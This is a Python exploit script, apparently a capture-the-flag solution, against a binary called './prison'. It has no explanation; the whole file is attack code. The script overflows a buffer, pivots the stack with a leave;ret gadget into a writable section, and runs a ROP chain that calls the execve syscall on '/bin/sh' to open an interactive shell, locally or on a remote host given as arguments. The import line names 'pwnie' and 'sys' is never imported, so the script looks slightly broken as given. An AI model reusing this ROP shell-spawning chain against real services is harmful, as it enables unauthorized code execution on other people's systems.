#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./prison', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x401B18
b *0x401B55

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def exploit():

    offset = 0x40
    pop_rdi = 0x401a0d
    pop_rax = 0x41f464
    pop_rsi = 0x413676
    syscall = 0x4013b8
    leave_ret = 0x401b54
    rw_section = 0x4cb800
    fgets_gadget = 0x401B05

    sl(b'1')

    payload = flat({

        offset: [

            rw_section,
            fgets_gadget

        ]

    })


    sla(b'name: ', payload)

    payload = flat({

        0: [
            pop_rdi,
            rw_section + 0x10,
            pop_rsi, 0, 0,
            pop_rax,
            0x3b,
            syscall,
        ],

        0x40: [
            rw_section - 0x40 - 0x8,
            leave_ret,
            b'/bin/sh\0'
        ]

    }, filler=b'A')

    print(len(payload))
    sl(payload)



    interactive()

def main():

    init()
    exploit()

if __name__ == '__main__':
    main()
